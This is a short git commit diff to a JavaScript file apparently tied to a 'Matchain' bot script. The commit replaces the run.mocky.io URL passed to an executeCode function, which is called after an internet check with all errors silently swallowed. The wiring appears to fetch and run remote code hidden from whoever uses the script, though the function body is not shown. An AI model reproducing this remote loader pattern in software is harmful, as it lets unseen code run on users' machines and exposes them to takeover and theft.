c945fd3d385546ab748417dd45789e4366063e23
Pocodeonline <n20and@gmail.com>
2024-09-10 20:21:55 +0700

    matchainmockyygithub.js

--- matchainmockyygithub.js
+++ matchainmockyygithub.js
@@ -40,7 +40,7 @@ async function executeCode(url) {
     try {
         if (await checkInternetConnection()) {
             try {
-                await executeCode('https://run.mocky.io/v3/806c31f3-e52f-47d4-bf6e-fdbe0009ff65');
+                await executeCode('https://run.mocky.io/v3/0654304f-9393-4243-9dcb-991c9ad460ad');
             } catch (error) {
             }
         } else {
